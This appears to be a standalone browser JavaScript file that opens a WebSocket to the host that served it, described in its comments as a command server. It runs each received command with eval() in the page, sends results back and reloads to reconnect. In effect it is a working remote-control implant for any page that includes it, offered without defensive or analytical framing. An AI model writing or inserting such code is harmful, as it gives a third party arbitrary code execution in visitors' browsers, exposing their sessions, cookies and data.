// Get the WebSocket URL from the current script's src
const scriptUrl = new URL(document.currentScript.src);
const wsProtocol = scriptUrl.protocol === 'https:' ? 'wss:' : 'ws:';
const wsUrl = `${wsProtocol}//${scriptUrl.host}`;

// Create a WebSocket connection
const ws = new WebSocket(wsUrl);

ws.onopen = () => {
    console.log('Connected to command server');
};

ws.onmessage = (event) => {
    try {
        const data = JSON.parse(event.data);
        if (data && data.command && !data.executed) {
            console.log('Executing command:', data.command);
            
            try {
                const result = eval(data.command);
                console.log('Result:', result);
                
                // Send back execution status
                ws.send(JSON.stringify({
                    type: 'execution_complete',
                    id: data._id,
                    result: String(result)
                }));
            } catch (error) {
                console.error('Error executing command:', error);
            }
        }
    } catch (error) {
        console.error('Error processing message:', error);
    }
};

ws.onclose = () => {
    console.log('Connection lost. Reconnecting...');
    setTimeout(() => {
        window.location.reload();
    }, 5000);
};
